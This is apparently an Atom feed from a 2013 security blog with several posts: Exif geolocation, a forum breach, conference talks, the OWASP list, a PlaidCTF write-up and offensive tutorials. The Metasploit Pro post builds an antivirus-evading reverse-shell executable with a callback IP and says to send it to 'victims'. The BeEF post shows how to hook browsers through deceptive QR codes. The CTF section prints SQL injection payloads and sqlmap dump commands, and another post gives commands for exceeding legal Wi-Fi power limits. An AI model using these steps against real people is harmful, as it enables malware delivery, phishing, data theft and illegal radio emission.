    <id>http://cubalo.github.io/blog/2013/08/05/gen-alexander-black-hat-2013</id>
    <content type="html"><![CDATA[<p>http://www.youtube.com/watch?v=V3_pmuJRs84</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Extracting Exif Data with Linux]]></title>
    <link href="http://cubalo.github.io/blog/2013/07/26/extracting-exif-data-with-linux/"/>
    <updated>2013-07-26T00:00:00-04:00</updated>
    <id>http://cubalo.github.io/blog/2013/07/26/extracting-exif-data-with-linux</id>
    <content type="html"><![CDATA[<p>Exchangeable image file format, or Exif, is a standard for storing information in image files. Most digital cameras, including smartphones, use Exif annotations. Some of the information stored includes exposure time, shutter speed, and F number, but more important to us is the date and time the photo was taken as well as GPS information. This information can be used to identify when and where a photo was taken, an obvious security concern.</p>
<p>Granted, this is relatively old news but still relevant due to the sheer number of iPhones out there and the fact that you have to explicitly decline geotagging on those devices.</p>
<p>In this post, I&#8217;m going to show how to retrieve this data from a photo and extract the useful information to track down when and where a photo was taken.</p>
<p>The first thing to do is to install exiftools. Do this with the following command.</p>
<pre>sudo apt-get install libimage-exiftool-perl</pre>
<p>Once that is installed, grab the picture you want to analyze. <strong>It must be in either .TIF or .JPG format or you will not be able to pull the data. </strong>Put the picture somewhere easy to remember and run this command:</p>
<pre>exifdata -a photo.JPG</pre>
<p>This will display all of the Exif data available. There are a few key fields to look for:</p>
<ul>
<li><span style="line-height: 13px;">Make</span></li>
<li>Camera Model Name</li>
<li>Create Date</li>
<li>GPS Latitude</li>
<li>GPS Longitude</li>
</ul>
<p>Instead of parsing through all of that information for every photo, the following command will extract all of that information we care about.</p>
<pre>exiftool -a -make -model -DateTimeOriginal -gps:all photo.JPG</pre>
<p>This will present the information like so.</p>
<pre>Make : Apple
Camera Model Name : iPhone 5
Date/Time Original : 2013:06:10 13:55:46
GPS LatitudRee Ref : North
GPS Latitude : 25 deg 11' 50.2152"
GPS Longitude Ref : East
GPS Longitude : 55 deg 16' 27.2208"
GPS Altitude Ref : Above Sea Level
GPS Altitude : 835.8427653 m
GPS Time Stamp : 09:55:45.73
GPS Img Direction Ref : True North
GPS Img Direction : 5.834875116</pre>
<p>Now this information can be taken to Google Maps/Earth and you can locate where that photo was taken within a few meters. For the sample above, this is what you should see:</p>
<p><a href="http://www.cubalo.com/blog/wp-content/uploads/2013/07/google_maps_GPS.jpg"><img class="alignnone size-medium wp-image-162" alt="google_maps_GPS" src="http://www.cubalo.com/blog/wp-content/uploads/2013/07/google_maps_GPS-300x136.jpg" width="300" height="136" /></a></p>
<h2> Remediation</h2>
<p>Luckily this is very easy to fix on the iPhone. To avoid this happening to you, go into Settings &gt; Privacy &gt; Location Services  and make sure the slider next to Camera is set to &#8220;OFF.&#8221; Now GPS tags will not be added to your photos. If you alread have a photo you would like to remove the geotags from, issue the following command.</p>
<pre>exiftool -a -gps:all= /Path/To/Image.JPG</pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Ubuntu Forums Breached]]></title>
    <link href="http://cubalo.github.io/blog/2013/07/21/ubuntu-forums-breached/"/>
    <updated>2013-07-21T00:00:00-04:00</updated>
    <id>http://cubalo.github.io/blog/2013/07/21/ubuntu-forums-breached</id>
    <content type="html"><![CDATA[<p>At 20:11UTC, a defacement of the Ubuntu Forums was reported to Canonical and at 20:15UTC the site was taken down and replaced with a splash page. According to the official Canonical statement, the attack method used in the breach is still unknown. The statement also states:</p>
<blockquote>
<ul>
<li>We have confirmed the attackers <strong>were able to access all user email addresses and hashed passwords</strong> on the Forums site. While the passwords were not stored in plain text, good practice dictates that users should assume the passwords have been accessed and change them. If users used the same password on other services they should immediately change that password.</li>
</ul>
<ul>
<li>We believe the issue is limited to the Ubuntu Forums and no other Ubuntu or Canonical site or service is affected.</li>
</ul>
<ul>
<li>We have begun the process of notifying by email all users whose details have been compromised.</li>
</ul>
</blockquote>
<p><a href="http://www.cubalo.com/blog/wp-content/uploads/2013/07/ubuntu_forums_screenshot.png"><img class="size-medium wp-image-171 aligncenter" alt="ubuntu_forums_screenshot" src="http://www.cubalo.com/blog/wp-content/uploads/2013/07/ubuntu_forums_screenshot-300x150.png" width="300" height="150" /></a></p>
<p>If you are affected by this breach, now would be the time to update your passwords of other services, especially if you duplicate passwords. I will update this post as more information becomes available.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Black Hat USA 2013 - Briefings to Attend]]></title>
    <link href="http://cubalo.github.io/blog/2013/07/21/black-hat-usa-2013-briefings-to-attend/"/>
    <updated>2013-07-21T00:00:00-04:00</updated>
    <id>http://cubalo.github.io/blog/2013/07/21/black-hat-usa-2013-briefings-to-attend</id>
    <content type="html"><![CDATA[<p>I was reading through the talks that were selected for Black Hat USA this year and picked out a few that I found interesting. If you are going, I would recommend seeing these if at all possible and if you cannot, they should be posted online within a few months. I&#8217;ve linked each title to the description on the Black Hat website.</p>
<ul>
<li><a href="https://www.blackhat.com/us-13/briefings.html#Reidy" target="_blank">Combating the Insider Threat at the FBI: Real World Lessons Learned</a></li>
<li><a href="https://www.blackhat.com/us-13/briefings.html#Hofmann2" target="_blank">What Security Researchers Need to Know About Anti-Hacking Law</a></li>
<li><a href="https://www.blackhat.com/us-13/briefings.html#Esparza" target="_blank">PDF Attack: A Journey From the Exploit Kit to the Shellcode</a></li>
<li><a href="https://www.blackhat.com/us-13/briefings.html#Niemi" target="_blank">Evading Deep Inspection for Fun and Shell</a></li>
<li><a href="https://www.blackhat.com/us-13/briefings.html#Cole" target="_blank">OPSEC Failures of Spies</a></li>
<li><a href="https://www.blackhat.com/us-13/briefings.html#Porter" target="_blank">Let&#8217;s Get Physical: Breaking Home Security Systems and Bypassing Buildings Controls</a></li>
<li><a href="https://www.blackhat.com/us-13/briefings.html#Lee" target="_blank">Hacking, Surveilling, and Deceiving Victims on Smart TV</a></li>
<li><a href="https://www.blackhat.com/us-13/briefings.html#Lau" target="_blank">Mactans: Injecting Malware Into iOS Devices Via Malicious Chargers</a></li>
<li><a href="https://www.blackhat.com/us-13/briefings.html#Duckwall" target="_blank">Pass-the-Hash 2: The Admin&#8217;s Revenge</a></li>
<li><a href="https://www.blackhat.com/us-13/briefings.html#Yarochkin" target="_blank">Hunting the Shadows: In Depth Analysis of Escalated APT Attacks</a></li>
<li><a href="https://www.blackhat.com/us-13/briefings.html#Salgado" target="_blank">&#8217;) UNION SELECT `THIS_TALK` AS (&#8216;NEW OPTIMIZATION AND OBFUSCATION TECHNIQUES’)%00</a></li>
<li><a href="https://www.blackhat.com/us-13/briefings.html#Espinhara" target="_blank">Using Online Activity as Digital Fingerprints to Create a Better Spear Phisher</a></li>
<li><a href="https://www.blackhat.com/us-13/briefings.html#Crowley" target="_blank">Home Invasion v2.0 - Attacking Network-Controlled Hardware</a></li>
<li><a href="https://www.blackhat.com/us-13/briefings.html#Heffner" target="_blank">Exploiting Network Surveillance Cameras Like a Hollywood Hacker</a></li>
<li><a href="https://www.blackhat.com/us-13/briefings.html#Williams" target="_blank">Post Exploitation Operations with Cloud Synchronization Services</a></li>
</ul>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Increasing the Strength of Directional 802.11 Antennas]]></title>
    <link href="http://cubalo.github.io/blog/2013/07/20/increasing-the-strength-of-directional-802-11-antennas/"/>
    <updated>2013-07-20T00:00:00-04:00</updated>
    <id>http://cubalo.github.io/blog/2013/07/20/increasing-the-strength-of-directional-802-11-antennas</id>
    <content type="html"><![CDATA[<p><strong>NOTE: The methods described in this tutorial are <span style="text-decoration: underline;">illegal</span> in the United States. I cannot be held responsible for what you choose to do with this information. Please see <a href="http://www.ecfr.gov/cgi-bin/text-idx?c=ecfr&amp;SID=46df928b983f3d87aec0fc5c468ca9a1&amp;rgn=div5&amp;view=text&amp;node=47:1.0.1.1.16&amp;idno=47#47:1.0.1.1.16.3.234.31" target="_blank">FCC Title 47, Section 15.247</a> for more information on RF regulations and limitations within the US.</strong></p>
<p>I recently learned about a little trick for getting the most out of directional wifi antennas. In the US, the FCC prohibits devices with a maximum Equivalent Isotropically Radiated Power (EIRP) greater than 36dBm (4 Watts). This is calculated by adding the antenna gain and the device&#8217;s output power. The table below shows some examples.</p>
<table width="93%" border="0">
<tbody>
<tr>
<td align="center" height="34"><b><span style="font-size: small;">Antenna<br />
Gain (dBi)</span></b></td>
<td align="center" height="34"><b><span style="font-size: small;">Device Output<br />
Power Allowed</span></b></td>
<td align="center" height="34"><b><span style="font-size: small;">EIRP<br />
(dBm)</span></b></td>
<td align="center" height="34"><b><span style="font-size: small;">EIRP<br />
(Watts)</span></b></td>
</tr>
<tr>
<td align="center"><span style="font-family: Arial; font-size: small;">6</span></td>
<td align="center"><span style="font-family: Arial; font-size: small;">30dBm or 1000mW</span></td>
<td align="center"><span style="font-family: Arial; font-size: small;">36</span></td>
<td align="center"><span style="font-family: Arial; font-size: small;">4</span></td>
</tr>
<tr>
<td align="center"><span style="font-family: Arial; font-size: small;">9</span></td>
<td align="center"><span style="font-family: Arial; font-size: small;">27dBm or 500mW</span></td>
<td align="center"><span style="font-family: Arial; font-size: small;">36</span></td>
<td align="center"><span style="font-family: Arial; font-size: small;">4</span></td>
</tr>
<tr>
<td align="center"><span style="font-family: Arial; font-size: small;">12</span></td>
<td align="center"><span style="font-family: Arial; font-size: small;">24dBm or 250mW</span></td>
<td align="center"><span style="font-family: Arial; font-size: small;">36</span></td>
<td align="center"><span style="font-family: Arial; font-size: small;">4</span></td>
</tr>
<tr>
<td align="center"><span style="font-family: Arial; font-size: small;">15</span></td>
<td align="center"><span style="font-family: Arial; font-size: small;">21dBm or 125mW</span></td>
<td align="center"><span style="font-family: Arial; font-size: small;">36</span></td>
<td align="center"><span style="font-family: Arial; font-size: small;">4</span></td>
</tr>
</tbody>
</table>
<p>So by giving a high-gain device more power, say all the way up to 1W (1000mW), you could go past this EIRP limit and increase the strength of the signal. Mind you, this is not only illegal but can also cause a serious health hazard. So if you plan to try this, please read the <a href="http://transition.fcc.gov/Bureaus/Engineering_Technology/Documents/bulletins/oet65/oet65.pdf" target="_blank">FCC OET 65 guidlines for human safety</a>.</p>
<p>Implementing this only takes a few commands. Linux&#8217;s iw command allows you to manipulate radios connected to your device very simply. The first thing to do is to connect your radio and find out which interface it comes up as. You can find this information with the iwconfig command. This is what mine looked like:</p>
<pre>root@cubalo:~# iwconfig 
lo no wireless extensions.

wlan1 IEEE 802.11abgn ESSID:off/any 
 Mode:Managed Access Point: Not-Associated Tx-Power=27 dBm 
 Retry long limit:7 RTS thr:off Fragment thr:off
 Encryption key:off
 Power Management:on</pre>
<p>The important field to watch is &#8220;Tx-Power.&#8221;</p>
<p>Now that we know the radio came up as wlan1, we can manipulate it by changing the country code and thus removing the FCC restrictions. For example&#8217;s sake, we will change the country code to Bolivia, but in theory you could change it to whatever ISO 3166-alpha2 country code you want.</p>
<pre>ifconfig wlan1 down
iw reg set BO</pre>
<p>Now you are free to up the power and you can also use higher channels than the FCC allows in the States. Make sure to set the tx power to use the maximum output possible. My radio can handle 1000mW (1W), so I will use 30dBm in the command below, but you can change that to suit your needs. To change the tx power and bring the interface back up, use the following command:</p>
<pre>iwconfig wlan1 txpower 30
ifconfig wlan1 up</pre>
<p>Finally, check the interface&#8217;s configuration again and verify that the Tx-Power field has changed.</p>
<pre>root@cubalo:~# iwconfig wlan1
wlan1 IEEE 802.11abgn ESSID:off/any 
 Mode:Managed Frequency:2.472 GHz Access Point: Not-Associated 
 Tx-Power=30 dBm 
 Retry long limit:7 RTS thr:off Fragment thr:off
 Encryption key:off
 Power Management:on</pre>
<p>For more information about manipulating the radio, read the <a href="http://wireless.kernel.org/en/users/Documentation/iw" target="_blank">Linux wireless documentation</a>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[2013 OWASP Top 10 Released]]></title>
    <link href="http://cubalo.github.io/blog/2013/06/14/2013-owasp-top-10-released/"/>
    <updated>2013-06-14T00:00:00-04:00</updated>
    <id>http://cubalo.github.io/blog/2013/06/14/2013-owasp-top-10-released</id>
    <content type="html"><![CDATA[<p>On June 12, the Open Web Application Security Project (OWASP) released an updated list of the top 10 web application vulnerabilities facing developers. This is the first major update to the list since 2010, which was well integrated into many web app testing frameworks and methodologies.</p>
<p>The OWASP Top 10 - 2013 is as follows:</p>
<ul>
<li>A1 - <a href="https://www.owasp.org/index.php/Top_10_2013-A1-Injection" target="_blank">Injection</a></li>
<li>A2 - <a href="https://www.owasp.org/index.php/Top_10_2013-A2-Broken_Authentication_and_Session_Management" target="_blank">Broken Authentication and Session Management</a> (was formerly 2010-A3)</li>
<li>A3 - <a href="https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS)" target="_blank">Cross-Site Scripting (XSS)</a> (was formerly 2010-A2)</li>
<li>A4 - <a href="https://www.owasp.org/index.php/Top_10_2013-A4-Insecure_Direct_Object_References" target="_blank">Insecure Direct Object References</a></li>
<li>A5 - <a href="https://www.owasp.org/index.php/Top_10_2013-A5-Security_Misconfiguration" target="_blank">Security Misconfiguration</a> (was formerly 2010-A6)</li>
<li>A6 - <a href="https://www.owasp.org/index.php/Top_10_2013-A6-Sensitive_Data_Exposure" target="_blank">Sensitive Data Exposure</a> (2010-A7 Insecure Cryptographic Storage and 2010-A9 Insufficient Transport Layer Protection were merged to form 2013-A6)</li>
<li>A7 - <a href="https://www.owasp.org/index.php/Top_10_2013-A7-Missing_Function_Level_Access_Control" target="_blank">Missing Function Level Access Control</a> (renamed/broadened from 2010-A8 Failure to Restrict URL Access)</li>
<li>A8 - <a href="https://www.owasp.org/index.php/Top_10_2013-A8-Cross-Site_Request_Forgery_(CSRF)" target="_blank">Cross-Site Request Forgery (CSRF) </a>(was formerly 2010-A5)</li>
<li>A9 - <a href="https://www.owasp.org/index.php/Top_10_2013-A9-Using_Components_with_Known_Vulnerabilities" target="_blank">Using Known Vulnerable Components</a> (new but was part of 2010-A6 – Security Misconfiguration)</li>
<li>A10 - <a href="https://www.owasp.org/index.php/Top_10_2013-A10-Unvalidated_Redirects_and_Forwards" target="_blank">Unvalidated Redirects and Forwards</a></li>
</ul>
<p>For more information, head over to the <a href="https://www.owasp.org/index.php/Top10" target="_blank">OWASP Top 10 project page.</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[UPDATE] AV Evasion with Metasploit Pro's Dynamic Executable Option]]></title>
    <link href="http://cubalo.github.io/blog/2013/05/08/update-av-evasion-with-metasploit-pros-dynamic-executable-option/"/>
    <updated>2013-05-08T00:00:00-04:00</updated>
    <id>http://cubalo.github.io/blog/2013/05/08/update-av-evasion-with-metasploit-pros-dynamic-executable-option</id>
    <content type="html"><![CDATA[<p>A while back, I posted a tutorial about basic antivirus evasion with Metasploit but the methods I described had a very high rate of detection. I figured it was since Metasploit&#8217;s payloads are so well know that AV vendors have been able to get signatures for a large majority of the payloads that have been encoded, packed, etc, rendering them virtually unusable.</p>
<p>Now, if your work buys you toys like mine does it is possible that you have access to Metasploit Pro (the paid version of Metasploit). It comes with a few cool gadgets like a web interface that allows you to manage &#8220;campaigns&#8221; as well as a few added exploits and payloads. However, we are specifically interested in one option: exploit/pro/windows/dynamic_exe</p>
<p>Start by firing up the MSP console</p>
<pre>msfpro</pre>
<p>Then use the exploit/pro/windows/dynamic_exe option</p>
<pre>use exploit/pro/windows/dynamic_exe</pre>
<p>Then set the payload you want to use. I&#8217;ll use a Meterpreter reverse TCP for simplicity sake.</p>
<pre>set PAYLOAD windows/meterpreter/reverse_tcp</pre>
<p>Then set the options for the dynamic executable template</p>
<pre><span style="font-family: Consolas, Monaco, monospace; font-size: 12px; line-height: 18px;">set FILENAME evil.exe</span>
<span style="font-family: Consolas, Monaco, monospace; font-size: 12px; line-height: 18px;">set SERVICE false</span></pre>
<p>These options set the file name to evil.exe and makes sure that the new executable is not a service EXE (haven&#8217;t had much luck with that.)</p>
<p>Finally, set your standard Meterpreter options</p>
<pre><span style="font-family: Consolas, Monaco, monospace; font-size: 12px; line-height: 18px;">set LHOST 174.143.236.106</span>
<span style="font-family: Consolas, Monaco, monospace; font-size: 12px; line-height: 18px;">set LPORT 4443</span>
<span style="font-family: Consolas, Monaco, monospace; font-size: 12px; line-height: 18px;">set ExitOnSession false</span>
<span style="font-family: Consolas, Monaco, monospace; font-size: 12px; line-height: 18px;">exploit</span></pre>
<p>Once you tell it to exploit, MSP will drop the executable under your home directory (/root/.msf4/local/evil.exe on a default Kali install)</p>
<p>Now that you have a file to distribute to your victims, set up a simple MSP/F listener with the same details you set when building the exe.</p>
<pre><span style="font-family: Consolas, Monaco, monospace; font-size: 12px; line-height: 18px;">use exploit/multi/handler</span>
<span style="font-family: Consolas, Monaco, monospace; font-size: 12px; line-height: 18px;">set PAYLOAD windows/meterpreter/reverse_tcp</span>
<span style="font-family: Consolas, Monaco, monospace; font-size: 12px; line-height: 18px;">set LHOST 174.143.236.106</span>
<span style="font-family: Consolas, Monaco, monospace; font-size: 12px; line-height: 18px;">set LPORT 4443</span>
<span style="font-family: Consolas, Monaco, monospace; font-size: 12px; line-height: 18px;">set ExitOnSession false</span>
<span style="font-family: Consolas, Monaco, monospace; font-size: 12px; line-height: 18px;">exploit -j (I suggest running this as a job as there may be slow turnaround)</span></pre>
<p>All that is left to do is to distribute that evil.exe file to your victims and wait for someone to click it. Once it is opened, you will see a standard Meterpreter session opened on your listening box.</p>
<p>A quick note, <strong><span style="text-decoration: underline;">PLEASE</span> DO NOT SUBMIT WHATEVER PAYLOAD, EXECUTABLE, ETC YOU CREATE TO VIRUSTOTAL!</strong></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[PlaidCTF 2013 Writeup]]></title>
    <link href="http://cubalo.github.io/blog/2013/04/21/plaidctf-2013-writeup/"/>
    <updated>2013-04-21T00:00:00-04:00</updated>
    <id>http://cubalo.github.io/blog/2013/04/21/plaidctf-2013-writeup</id>
    <content type="html"><![CDATA[<p>PlaidCTF 2013 was a capture the flag tournament put on by the <a href="http://ppp.cylab.cmu.edu/wordpress/">Plaid Parliament of Pwning</a> and sponsored by <a href="http://www.endgame.com/#home">ENDGAME</a>. Unfortunately, I was unable to commit 100% to the CTF due to being under the weather and having family in town, but I figured I&#8217;d share what I solved. Most of the challenges were reverse engineering and forensics (not my strongest points), but it was fun nonetheless.</p>
<h1>charsheet (Web - 150)</h1>
<p><strong>Problem: My friend is in my D&amp;D campaign - could you get me his character name? He administrates <a href="http://54.234.77.50/" target="_blank">this site</a>. Or <a href="http://54.235.50.140/">here (faster)</a>.</strong></p>
<p>On the site, there is a RPG Web Profiler app that catalouges RPG characters and their campaigns. The goal is the find the user who admins the site.</p>
<p>That meant that I needed to find a listing of all users in the game. The problem is that users can choose whether or not to make their profile public (only about 45 at the time of completion did) so I had to find a way to either make users change their profile to public, of get a full listing of active users from the backend database.</p>
<p>At first, I signed into my profile and found a section where you could set your profile image from a file out on the web, so I figured why not try some CSRF? I inserted a URL that would set a user&#8217;s profile to &#8220;Public&#8221; and saved. As users would hit my profile, it would make their profile Public and anyone could access it.</p>
<p><a href="http://www.cubalo.com/blog/wp-content/uploads/2013/04/profile_pic_uploader.png"><img class="alignnone size-medium wp-image-114" alt="profile_pic_uploader" src="http://www.cubalo.com/blog/wp-content/uploads/2013/04/profile_pic_uploader-300x158.png" width="300" height="158" /></a></p>
<p>The problem with this though was that I had to hope the admin user was live and would hit my profile. To make the likelihood of getting that admin user to give up their privacy, I changed my CSRF link to a URL that would transfer ownership of the account to me. Once I had compromised an account, I would change their profile picture to the CSRF that would make a user switch to &#8220;Public.&#8221;</p>
<p><a href="http://www.cubalo.com/blog/wp-content/uploads/2013/04/captured_profiles.png"><img class="alignnone size-medium wp-image-111" alt="captured_profiles" src="http://www.cubalo.com/blog/wp-content/uploads/2013/04/captured_profiles-300x96.png" width="300" height="96" /></a></p>
<p>I quickly found that although effective, it would take a long time to complete so I started to explore other options.</p>
<p>I found a search field and tried a basic &#8221; &#8217; Or 1=1-&#8221; on it and it threw an error! Woohoo!</p>
<p><a href="http://www.cubalo.com/blog/wp-content/uploads/2013/04/sql_error.png"><img class="alignnone size-medium wp-image-116" alt="sql_error" src="http://www.cubalo.com/blog/wp-content/uploads/2013/04/sql_error-300x40.png" width="300" height="40" /></a></p>
<p>So now I knew that there was a vulnerable MySQL server running in the background. I tried my luck with a raw connection to the database, but no dice so I fired up sqlmap and got to work.</p>
<p>I pointed it at the site with the following string:</p>
<pre>./sqlmap.py -u "http://54.234.77.50/search.php?type=contains&amp;cname=1"</pre>
<p>and compromised the database with the string:</p>
<pre>type=contains&amp;cname=1') UNION ALL SELECT NULL, NULL, NULL, CONCAT(CHAR(58,105,116,113,58),CHAR(79,71,65,69,80,88,106,99,66,67),CHAR(58,102,118,121,58)), NULL, NULL# AND ('kCbZ'='kCbZ
---</pre>
<p><a href="http://www.cubalo.com/blog/wp-content/uploads/2013/04/sql_compromise.png"><img class="alignnone size-medium wp-image-115" alt="sql_compromise" src="http://www.cubalo.com/blog/wp-content/uploads/2013/04/sql_compromise-300x184.png" width="300" height="184" /></a></p>
<p>So now all I had to do was run through the database, find the table I wanted and then dump it. Long story short, this was the syntax to do just that:</p>
<pre>/sqlmap.py -u "http://54.234.77.50/search.php?type=contains&amp;cname=1" -D "charsheet" -T "characters" --dump</pre>
<p>This dumped a CSV file to the output folder and had three columns with names that could possibly be flags: cname, edited_by, and owner.</p>
<p><a href="http://www.cubalo.com/blog/wp-content/uploads/2013/04/csv_of_users.png"><img class="alignnone size-medium wp-image-113" alt="csv_of_users" src="http://www.cubalo.com/blog/wp-content/uploads/2013/04/csv_of_users-300x90.png" width="300" height="90" /></a></p>
<p>I combined all of these columns into a file and then left only the unique ones in it with this command:</p>
<pre>sort characters.txt | uniq -u</pre>
<p>Finally, I pumped this list of about 120 entries to Burp Suite&#8217;s intruder, set it up to submit to the proper location, and started it. Within about 2 minutes the challenge was complete.</p>
<p><a href="http://www.cubalo.com/blog/wp-content/uploads/2013/04/correct_flag_charsheet.png"><img class="alignnone size-medium wp-image-112" alt="correct_flag_charsheet" src="http://www.cubalo.com/blog/wp-content/uploads/2013/04/correct_flag_charsheet-300x106.png" width="300" height="106" /></a></p>
<p><strong>Answer: r3al50ftwar3ftw</strong></p>
<h1>Unnnnlucky (Misc - 20)</h1>
<p><strong>Problem: Where does The Plague hide his money?</strong></p>
<p>This is a reference to the movie <em>Hackers </em>(1995). Unfortunately, the only way to know the answer to this is to have watched the movie.</p>
<p><strong>Answer: <strong>03087-08351-27H</strong></strong></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hooking Browsers with BeEF & QR Codes]]></title>
    <link href="http://cubalo.github.io/blog/2013/04/12/fun-with-beef-qr-codes/"/>
    <updated>2013-04-12T00:00:00-04:00</updated>
    <id>http://cubalo.github.io/blog/2013/04/12/fun-with-beef-qr-codes</id>
    <content type="html"><![CDATA[<p>For those unfamiliar with the Browser Exploitation Framework Project, or BeEF, it is a tool that can be used to launch attacks against the often only door left open, the web browser. Once the browser is compromised, BeEF can launch further attacks to control the system. While some of us know not to scan any QR code we find, most people assume that they are safe. You can find them posted all around. Sales circulars, marketing materials, magazines, they&#8217;re everywhere. Why not take advantage of that inherent trust?</p>
<p>For this tutorial, I&#8217;m going to assume that you are running Backtrack 5 R3 or Kali. If not, installation instructions can be found <a href="https://github.com/beefproject/beef/wiki/Installation">here</a>.</p>
<h1>customhook</h1>
<p>First things first, we need to edit the customhook config. When BeEF fires up, it sets the hook location to your.i.p.address/hook/ which is pretty obvious. So by editing the config, we can set a custom name for our hook and make it a little less conspicuous. The config can be found at $BEEF_ROOT/extensions/customhook/config.yaml. Pop that open with your favorite editor and change the values to whatever you want. Its pretty self-explanatory.</p>
<pre>#
# Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
beef:
    extension:
        customhook:
            enable: true
            name: 'Custom Hook Point with iFrame Impersonation'
            customhook_path: "/notice"
            customhook_target: "http://heyyeyaaeyaaaeyaeyaa.com/"
            customhook_title: "Notice"</pre>
<p>Make sure you set &#8220;enable:&#8221; to true.</p>
<h1>qrcode</h1>
<p>Next, we need to edit the qrcode extension&#8217;s config. All you need to do here is set &#8220;enable:&#8221; to true and set the &#8220;target:&#8221; to your customhook location (or a bit.ly link of it if you&#8217;re feeling extra sneaky ;) ). It can be found at $BEEF_ROOT/extensions/qrcode/config.yaml.</p>
<pre>#
# Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
beef:
    extension:
        qrcode:
            name: 'QR Code Generator'
            enable: true
            authors: ["xntrik"]
            target: ["mybeefserver.com/notice"]
            qrsize: "300x300"</pre>
<p>Now when you start BeEF, it will generate a QR code for your hook. You can also append the URL of your customhook to https://chart.googleapis.com/chart?cht=qr&amp;chs=300x300&amp;chl= and it&#8217;ll generate a code for you.</p>
<h1>Attack!</h1>
<p>Once you fire up BeEF after making the changes, it will create your custom hook in the location your set as well as provide you a URL where you can download your QR code from. Now the only thing left to do is figure out how you want to use it. &#8220;Scan this to try our new mobile banking app for your iPhone!&#8221; The possibilities are endless.</p>
]]></content>
  </entry>
  
</feed>
